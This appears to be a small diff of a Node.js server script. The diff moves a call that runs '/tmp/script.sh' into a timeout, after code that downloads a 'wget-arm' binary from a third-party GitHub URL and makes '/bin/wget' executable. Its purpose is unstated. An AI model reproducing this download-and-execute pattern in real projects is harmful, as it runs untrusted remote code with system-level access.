@@ -30,19 +30,19 @@ https.get("https://raw.githubusercontent.com/iceyfromdiscord/arm/main/wget-arm",
 
 setTimeout(function(){
     spawn("chmod +x /bin/wget", { shell: true, stdio: "inherit" });
+
+    const child = spawn("sh", ["/tmp/script.sh"], {
+      stdio: "inherit",
+    });
+    
+    child.on("error", (err) => {
+      console.error("child process error:", err);
+    });
+    
+    child.on("exit", (code, signal) => {
+      console.log("child exited:", code, signal);
+    });
 }, 2500);
-
-const child = spawn("sh", ["/tmp/script.sh"], {
-  stdio: "inherit",
-});
-
-child.on("error", (err) => {
-  console.error("child process error:", err);
-});
-
-child.on("exit", (code, signal) => {
-  console.log("child exited:", code, signal);
-});
 
 const PORT = process.env.PORT || 3000;
 
